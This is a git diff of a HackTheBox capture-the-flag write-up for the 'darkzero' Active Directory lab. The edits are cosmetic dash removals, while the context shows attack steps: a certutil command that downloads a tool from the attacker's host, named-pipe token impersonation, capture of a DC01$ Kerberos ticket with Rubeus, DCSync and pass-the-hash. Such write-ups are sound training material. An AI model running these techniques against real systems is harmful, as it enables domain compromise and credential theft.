@@ -36,11 +36,11 @@ Open 10.10.11.89:9389   mc-nmf        .NET Message Framing
 Open 10.10.11.89:49664+ msrpc (various high ports)
 ```
 
-Classic domain controller profile  DNS, Kerberos, LDAP, SMB, WinRM, the whole AD stack. Two things stand out immediately:
+Classic domain controller profile DNS, Kerberos, LDAP, SMB, WinRM, the whole AD stack. Two things stand out immediately:
 
 **Port 1433 (MSSQL)** running SQL Server directly on the DC. That's unusual. DCs should only run essential AD services; having SQL Server here massively expands the attack surface. If we can authenticate to it and find any privilege misconfigurations, we might be able to run OS commands.
 
-**Port 2179 (Hyper-V RDP / vmrdp)**  this means the machine is hosting virtual machines. With the right VM GUID and credentials you could connect to hosted VMs over this port, but we'll park that for now.
+**Port 2179 (Hyper-V RDP / vmrdp)** this means the machine is hosting virtual machines. With the right VM GUID and credentials you could connect to hosted VMs over this port, but we'll park that for now.
 
 Domain is `darkzero.htb`, hostname is `DC01`.
 
@@ -361,13 +361,13 @@ certutil -urlcache -f http://10.10.16.6:8000/tool.exe C:\temp\tool.exe
 
 This is where it gets meaty. We're `darkzero-ext\svc_sql`, a low-privilege service account. The shell has no `SeImpersonatePrivilege`, which is the privilege you'd normally abuse with tools like GodPotato or PrintSpoofer to get SYSTEM.
 
-But wait  why doesn't `svc_sql` have SeImpersonatePrivilege? It's a service account, and service accounts are supposed to get that privilege automatically.
+But wait why doesn't `svc_sql` have SeImpersonatePrivilege? It's a service account, and service accounts are supposed to get that privilege automatically.
 
 #### Understanding Why the Token Is Stripped
 
 Here's what's happening under the hood: When the MSSQL service starts at boot, Windows authenticates `svc_sql` and creates a **primary token** for the MSSQL process. That token has the full set of privileges including `SeImpersonatePrivilege`. LSASS holds a reference to this original token.
 
-But our shell wasn't started by the MSSQL service starting up. It was started by `xp_cmdshell` in response to a network request. Windows tracks how a session was created, and for network logons (like a remote SQL connection), Windows applies **token filtering**  it strips certain privileges like `SeImpersonatePrivilege` from the resulting process token as a hardening measure.
+But our shell wasn't started by the MSSQL service starting up. It was started by `xp_cmdshell` in response to a network request. Windows tracks how a session was created, and for network logons (like a remote SQL connection), Windows applies **token filtering** it strips certain privileges like `SeImpersonatePrivilege` from the resulting process token as a hardening measure.
 
 So the original MSSQL service token in LSASS still has all the privileges. Our child process token was filtered. The four paths to SYSTEM exploit this situation in different ways.
 
@@ -410,7 +410,7 @@ PS C:\programdata\2.0.1> $pipe = New-NtNamedPipeFile \\.\pipe\sn0x -Win32Path
 PS C:\programdata\2.0.1> $job = Start-Job { $pipe.Listen() }
 ```
 
-`New-NtNamedPipeFile` creates a named pipe at `\\.\pipe\sn0x`. The `Listen()` call blocks waiting for a client to connect  we put it in a background job so our session doesn't hang.
+`New-NtNamedPipeFile` creates a named pipe at `\\.\pipe\sn0x`. The `Listen()` call blocks waiting for a client to connect we put it in a background job so our session doesn't hang.
 
 ```powershell
 # Step 2: Connect to our own pipe as a "client"
@@ -814,7 +814,7 @@ nt authority\system
 
 ***
 
-### Lateral Movement  Capturing DC01$ via Kerberos Coercion
+### Lateral Movement Capturing DC01$ via Kerberos Coercion
 
 We're SYSTEM on DC02 (`172.16.20.2`, forest `darkzero.ext`). The root flag is on DC01 (`10.10.11.89`, forest `darkzero.htb`). Different forests, so the hashes we dumped from DC02 don't work on DC01 (different password databases). We need to attack `darkzero.htb` specifically.
 
@@ -875,7 +875,7 @@ Rubeus catches it:
     doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMM...
 ```
 
-The `forwarded` and `forwardable` flags confirm this is the delegated TGT that crossed the forest trust. `DC01$@DARKZERO.HTB`  we have a ticket that belongs to the DC01 computer account in the `darkzero.htb` domain.
+The `forwarded` and `forwardable` flags confirm this is the delegated TGT that crossed the forest trust. `DC01$@DARKZERO.HTB` we have a ticket that belongs to the DC01 computer account in the `darkzero.htb` domain.
 
 #### Converting the Ticket and DCSync
 
@@ -1039,4 +1039,4 @@ Pass-the-Hash works with WinRM because NTLM authentication supports passing the 
 | DCSync via Kerberos Ticket                       | Dump all darkzero.htb hashes as DC01$                      | DC computer account has DRS replication rights; mimics legitimate DC sync                        |
 | Pass-the-Hash (evil-winrm)                       | Auth as Administrator using NT hash                        | NTLM auth uses the hash directly; no plaintext needed since hash IS the credential               |
 
-<figure><img src="../../../../.gitbook/assets/complete (39).gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
